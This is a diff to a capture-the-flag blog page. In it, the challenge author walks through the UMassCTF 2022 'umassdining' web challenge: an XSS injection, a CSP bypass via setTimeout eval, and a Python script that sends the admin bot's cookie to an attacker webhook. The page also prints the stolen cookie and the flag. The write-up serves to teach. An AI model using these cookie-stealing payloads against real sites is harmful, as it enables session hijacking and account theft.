@@ -143,24 +143,24 @@ while(counter&lt;50):
             <h4 id="-umassdining-"><em>umassdining</em></h4>
             <h5 id="introduction">Introduction</h5>
             <p>This was the hardest of the three challenges, both in number of solves and actually creating it. It&#39;s a simple XSS -&gt; CSRF attack with an admin browser checking responses. However, to make it slightly harder I added a content security policy to only allow in-domain requests to occur. I did however, leave a relatively straight forward vector for attack in the site. Below I&#39;ll give a writeup including what someone who solved this challenge may have been thinking. </p>
-            <p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/challenge3.png" alt=""></p>
+            <p><img src="images/challenge3.png" alt=""></p>
             <h5 id="initial-findings">Initial Findings</h5>
             <p>The challenge description gives us a file to download and view some source in, let&#39;s check that out first before running it locally. We can see that there is a flask server running in <code>main.py</code> aswell as a <code>bot.py</code> file in the <code>/bot/</code> directory. Working backwards, we can see the flag is given if we sent our authentication cookie to <code>/join</code>. However if we try to join normally we will be rejected.</p>
-            <p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/flagpossible.png" alt=""></p>
+            <p><img src="images/flagpossible.png" alt=""></p>
             <p>If we look for other occurences of <code>admin_cookie</code> in either file we find that in bot.py, a headless bot browser opens a request with  url paramaters <code>essay</code> and <code>email</code> to <code>/review/essay</code>. When looking closely at the source code for the <code>/review/essay/</code> endpoint  we can see that our essay is injected into a html document with the safe flag which disables autoescaping of characters when rendering our injecting variable into a template.</p>
-            <p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/inject1.png" alt="">
-            <img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/inject2.png" alt=""></p>
+            <p><img src="images/inject1.png" alt="">
+            <img src="images/inject2.png" alt=""></p>
             <h5 id="investigation">Investigation</h5>
             <p> Putting all our information together, we can craft an XSS payload to exfiltrate an admin cookie over to our server and then authenticate as them on <code>/join</code> to get an easy flag. Send a POST request with essay and email in the form data and the bot will start working on another thread. So we send a basic payload <code>&lt;img src=1 onerror=fetch(`ourserver${document.cookie}`)&gt;</code></p>
-            <p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/register.png" alt=""></p>
+            <p><img src="images/register.png" alt=""></p>
             <p>And we recieve nothing back, our payload seems fine so let&#39;s open up the web tools console and try the javascript on the site. We see two big things: First off, our fetch request is being rejected due to Content Security Policy only allowing <code>&#39;self&#39;</code>. If you decide to look furthur into Content Security Policy, you&#39;ll also see that all of our unsafe in-line payloads will be blocked. So is it impossible to exploit? Nope, the second  big thing we see is a strange message in console: <code>DOM content loaded for user</code> and it&#39;s being initiated by a <code>thing.js</code> file.</p>
-            <p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/test.png" alt="">
-            <img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/big1.png" alt=""></p>
+            <p><img src="images/test.png" alt="">
+            <img src="images/big1.png" alt=""></p>
             <p>Checking out this file, it seems like a simple script that will wait for the DOM content of the site to be loaded before timing out. If you&#39;re not familiar with this javascript execution sink, you might be hinted by the content security policy which for some reason allows <code>&#39;unsafe eval&#39;</code>. Since we now know that the first parameter of <code>setTimeout()</code> is an eval we can start crafting a string to break out of it.</p>
-            <p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/unsafejs.png" alt=""></p>
+            <p><img src="images/unsafejs.png" alt=""></p>
             <h5 id="exploitation">Exploitation</h5>
             <p>After some tampering your string should look something like: <code>&gt;hi&#39;);document.location=&#39;[YOUR SERVER]?value=&#39;%2Bdocument.cookie;//</code>. We&#39;re using <code>document.location</code> to force the admin on our site and steal the cookie, this is because changing <code>document.location</code> will tell the browser to load the url string we assign to it. Finally, we just have to send the full payload similar to how the script is originally called on site. </p>
-            <p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/ogscript.png" alt=""></p>
+            <p><img src="images/ogscript.png" alt=""></p>
             <p>Below is the script to send a request to your webhook, aswell as the response we get on the webhook server.</p>
             <pre><code><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> r 
             url = input(<span class="hljs-string">"Add you webhook URL\n"</span>)
@@ -173,7 +173,7 @@ while(counter&lt;50):
             '"""</span>+url+<span class="hljs-string">"""?value='%2Bdocument.cookie;//"&gt;&amp;lt;/script&gt;"""</span>
             <span class="hljs-comment">#or whatever ip ur hosting this on</span>
             r1=r.post(<span class="hljs-string">"http://34.148.103.218:6942/register"</span>,data=data)
-            </code></pre><p><img src="http://127.0.0.1:8000/Blog/UMASSCTF2022/images/resp.png" alt=""></p>
+            </code></pre><p><img src="images/resp.png" alt=""></p>
             <h5 id="conclusion">Conclusion</h5>
             <p>Finally we send our cookie as <code>auth=VEgxUzFTRDRTVVAzUlMzQ1IzVDRETTFOQzAwS0kzTDBMIQ</code> and get our flag <code>UMASS{NUMB3R_0N3_1N_$TUD3NT_D1N1NG_XD86543267!}</code>. Overall this challenge was a bit harder but I&#39;d still put it at around beginner/intermediate difficiulty. I hope people learned a lot from this challenge, especially about how you should craft XSS payloads in a very limited environment. </p>            
         </div>
